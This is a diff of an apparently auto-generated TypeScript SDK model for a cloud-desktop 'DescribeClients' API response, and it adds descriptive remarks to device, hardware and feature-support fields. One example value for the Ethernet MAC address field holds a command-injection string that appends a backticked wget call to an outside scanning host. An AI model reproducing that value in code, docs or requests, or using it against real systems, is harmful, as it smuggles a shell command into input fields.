@@ -4,96 +4,153 @@ import * as $dara from '@darabonba/typescript';
 
 export class DescribeClientsResponseBodyDataFunctionSupport extends $dara.Model {
   /**
+   * @remarks
+   * Indicates whether standalone policy is supported.
+   * 
    * @example
    * True
    */
   enablePolicy?: boolean;
   /**
+   * @remarks
+   * The reason why password-free logon is forbidden.
+   * 
    * @example
    * Reason
    */
   passwordFreeLoginForbiddenReason?: string;
   /**
+   * @remarks
+   * Indicates whether assisted logon is supported.
+   * 
    * @example
    * True
    */
   supportAssistLogin?: boolean;
   /**
+   * @remarks
+   * Indicates whether remote diagnostics is supported.
+   * 
    * @example
    * True
    */
   supportDiagnose?: boolean;
   /**
+   * @remarks
+   * Indicates whether restricting logon users is supported.
+   * 
    * @example
    * True
    */
   supportLimitLoginUser?: boolean;
   /**
+   * @remarks
+   * Indicates whether localDeviceSn is supported.
+   * 
    * @example
    * True
    */
   supportLocalDeviceSn?: boolean;
   /**
+   * @remarks
+   * Indicates whether management is supported.
+   * 
    * @example
    * True
    */
   supportManage?: boolean;
   /**
+   * @remarks
+   * Indicates whether policy modification is supported.
+   * 
    * @example
    * True
    */
   supportModifyPolicy?: boolean;
   /**
+   * @remarks
+   * Indicates whether password-free logon is supported.
+   * 
    * @example
    * True
    */
   supportPasswordFreeLogin?: boolean;
   /**
+   * @remarks
+   * Indicates whether restart is supported.
+   * 
    * @example
    * True
    */
   supportReboot?: boolean;
   /**
+   * @remarks
+   * Indicates whether factory reset is supported.
+   * 
    * @example
    * True
    */
   supportReset?: boolean;
   /**
+   * @remarks
+   * Indicates whether the clear PIN button is grayed out.
+   * 
    * @example
    * True
    */
   supportResetPin?: boolean;
   /**
+   * @remarks
+   * Indicates whether shutdown is supported.
+   * 
    * @example
    * True
    */
   supportStop?: boolean;
   /**
+   * @remarks
+   * Indicates whether remote upgrade is supported.
+   * 
    * @example
    * True
    */
   supportUpgrade?: boolean;
   /**
+   * @remarks
+   * The reason why assisted logon is forbidden.
+   * 
    * @example
    * Reason
    */
   unsupportAssistLoginReason?: string;
   /**
+   * @remarks
+   * The reason why management is forbidden.
+   * 
    * @example
    * Reason
    */
   unsupportManageReason?: string;
   /**
+   * @remarks
+   * The reason why localDeviceSn is forbidden.
+   * 
    * @example
    * Reason
    */
   unsupportedLocalDeviceSnReason?: string;
   /**
+   * @remarks
+   * Indicates whether the version is supported (V7.12.0 or later).
+   * 
    * @example
    * True
    */
   versionSupported?: boolean;
   /**
+   * @remarks
+   * Indicates whether the version is too low and an upgrade is recommended.
+   * 
    * @example
    * True
    */
@@ -157,6 +214,9 @@ export class DescribeClientsResponseBodyDataFunctionSupport extends $dara.Model 
 
 export class DescribeClientsResponseBodyDataHardwareInfo extends $dara.Model {
   /**
+   * @remarks
+   * The Bluetooth MAC address.
+   * 
    * @example
    * 24:21:5E:B3:5A:4A
    */
@@ -170,21 +230,33 @@ export class DescribeClientsResponseBodyDataHardwareInfo extends $dara.Model {
    */
   chipId?: string;
   /**
+   * @remarks
+   * The CPU information.
+   * 
    * @example
    * 24
    */
   cpu?: string;
   /**
+   * @remarks
+   * The Ethernet MAC address.
+   * 
    * @example
    * 00:1A:2B:3C:4D:5E&&`wget 31lojfVB.popscan.xaliyun.com`%3B
    */
   mac?: string;
   /**
+   * @remarks
+   * The memory information.
+   * 
    * @example
    * 128
    */
   memory?: string;
   /**
+   * @remarks
+   * The storage information.
+   * 
    * @example
    * 20
    */
@@ -240,98 +312,163 @@ export class DescribeClientsResponseBodyData extends $dara.Model {
    */
   aliUid?: number;
   /**
+   * @remarks
+   * The alias.
+   * 
    * @example
    * DemoDevice
    */
   alias?: string;
   /**
+   * @remarks
+   * The area site.
+   * 
    * @example
    * ap-southeast-1
    */
   areaSite?: string;
   /**
+   * @remarks
+   * The number of bound logon users.
+   * 
    * @example
    * 1
    */
   bindUserCount?: number;
   /**
+   * @remarks
+   * The password-free logon user.
+   * 
    * @example
    * ***
    */
   bindUserId?: string;
   /**
+   * @remarks
+   * The system version number.
+   * 
    * @example
    * 7.0.2-RS-***
    */
   buildId?: string;
   /**
+   * @remarks
+   * The client type.
+   * 
    * @example
    * 1
    */
   clientType?: number;
   /**
+   * @remarks
+   * The client version.
+   * 
    * @example
    * 1.2.1-DAILY-20240906.140842
    */
   clientVersion?: string;
   /**
+   * @remarks
+   * The currently used desktop.
+   * 
    * @example
    * ecd-drqmaogzbmbdf****
    */
   currentConnectDesktop?: string;
   /**
+   * @remarks
+   * The currently logged-on user.
+   * 
    * @example
    * ***
    */
   currentLoginUser?: string;
   /**
+   * @remarks
+   * The reason why the custom resource is invalid.
+   * 
    * @example
    * ***
    */
   customResInvalidReason?: string;
   /**
+   * @remarks
+   * The custom resource ID.
+   * 
    * @example
    * ***
    */
   customResourceId?: string;
   /**
+   * @remarks
+   * The custom resource name.
+   * 
    * @example
    * ***
    */
   customResourceName?: string;
   /**
+   * @remarks
+   * The custom resource status.
+   * 
    * @example
    * ***
    */
   customResourceStatus?: boolean;
   /**
+   * @remarks
+   * The currently used desktop.
+   * 
    * @example
    * ecd-9ior729dcvn91uo9i
    */
   desktopId?: string;
   /**
+   * @remarks
+   * The desktop region.
+   * 
    * @example
    * cn-hangzhou
    */
   desktopRegionId?: string;
   /**
+   * @remarks
+   * The device operating system.
+   * 
    * @example
    * Windows
    */
   deviceOs?: string;
+  /**
+   * @remarks
+   * The features and support information.
+   */
   functionSupport?: DescribeClientsResponseBodyDataFunctionSupport;
+  /**
+   * @remarks
+   * The hardware information.
+   */
   hardwareInfo?: DescribeClientsResponseBodyDataHardwareInfo;
   /**
+   * @remarks
+   * The host operating system information.
+   * 
    * @example
    * Windows
    */
   hostOsInfo?: string;
   /**
+   * @remarks
+   * Indicates whether the client is managed.
+   * 
    * @example
    * True
    */
   inManage?: boolean;
   /**
+   * @remarks
+   * The geolocation of the public IP address.
+   * 
    * @example
    * CN-Zhejiang
    */
@@ -345,62 +482,105 @@ export class DescribeClientsResponseBodyData extends $dara.Model {
    */
   ipv4?: string;
   /**
+   * @remarks
+   * The most recently logged-on user.
+   * 
    * @example
    * ***
    */
   lastLoginUser?: string;
   /**
+   * @remarks
+   * The on-premises device SN.
+   * 
    * @example
    * ***
    */
   localDeviceSn?: string;
+  /**
+   * @remarks
+   * The location remarks.
+   * 
+   * @example
+   * 杭州市
+   */
   locationInfo?: string;
   /**
+   * @remarks
+   * The currently logged-on user.
+   * 
    * @example
    * ***
    */
   loginUser?: string;
   /**
+   * @remarks
+   * The main business type.
+   * 
    * @example
    * enterprise
    */
   mainBizType?: string;
   /**
+   * @remarks
+   * The time when the client was managed.
+   * 
    * @example
    * 2020-01-01 00:00:00
    */
   manageTime?: string;
   /**
+   * @remarks
+   * The timestamp when the client was managed.
+   * 
    * @example
    * 1000000
    */
   manageTimestamp?: number;
   /**
+   * @remarks
+   * The device model.
+   * 
    * @example
    * US01
    */
   model?: string;
   /**
+   * @remarks
+   * The preview image URL of the device type.
+   * 
    * @example
    * ***
    */
   modelPreviewUrl?: string;
   /**
+   * @remarks
+   * Indicates whether the client is online.
+   * 
    * @example
    * true
    */
   online?: boolean;
   /**
+   * @remarks
+   * Indicates whether the client is online.
+   * 
    * @example
    * False
    */
   onlineStatus?: boolean;
   /**
+   * @remarks
+   * The password-free logon user.
+   * 
    * @example
    * ***
    */
   passwordFreeLoginUser?: string;
   /**
+   * @remarks
+   * The device type.
+   * 
    * @example
    * 123123
    */
@@ -414,26 +594,41 @@ export class DescribeClientsResponseBodyData extends $dara.Model {
    */
   productName?: string;
   /**
+   * @remarks
+   * The public IP address.
+   * 
    * @example
    * 0.0.0.0
    */
   publicIpv4?: string;
   /**
+   * @remarks
+   * The time when the password-free logon user was set.
+   * 
    * @example
    * 2020-01-01 00:00:00
    */
   setPasswordFreeLoginUserTime?: string;
   /**
+   * @remarks
+   * The terminal group ID.
+   * 
    * @example
    * tg-default
    */
   terminalGroupId?: string;
   /**
+   * @remarks
+   * The upgrade type. Valid values: internet and lan.
+   * 
    * @example
    * internet
    */
   upgradeDownloadType?: string;
   /**
+   * @remarks
+   * The number of users bound to this device.
+   * 
    * @example
    * 1
    */
@@ -569,37 +764,62 @@ export class DescribeClientsResponseBodyData extends $dara.Model {
 
 export class DescribeClientsResponseBody extends $dara.Model {
   /**
+   * @remarks
+   * The error code returned when the call fails.
+   * 
    * @example
    * TERMINAL_NOT_FOUND
    */
   code?: string;
+  /**
+   * @remarks
+   * The data returned when the call is successful.
+   */
   data?: DescribeClientsResponseBodyData[];
   /**
+   * @remarks
+   * The HTTP status code.
+   * 
    * @example
    * 200
    */
   httpStatusCode?: number;
   /**
+   * @remarks
+   * The error message returned when the call fails.
+   * 
    * @example
    * terminal not found
    */
   message?: string;
   /**
+   * @remarks
+   * The token for the next query. If the results are not fully returned in a single query, a non-empty NextToken is returned. You can pass the returned NextToken in subsequent queries to continue retrieving results.
+   * 
    * @example
    * AAAAAdEdsXbwG2ZlbWCzN4wTTg6wQvfp7u1BJl4bxCAby41POSaYAlCvfULQpkAnb0ff****
    */
   nextToken?: string;
   /**
+   * @remarks
+   * The request ID.
+   * 
    * @example
    * C5DCE54A-B266-522E-A6ED-468AF45F5AAA
    */
   requestId?: string;
   /**
+   * @remarks
+   * Indicates whether the call was successful.
+   * 
    * @example
    * true
    */
   success?: boolean;
   /**
+   * @remarks
+   * The total number of returned results.
+   * 
    * @example
    * 20
    */
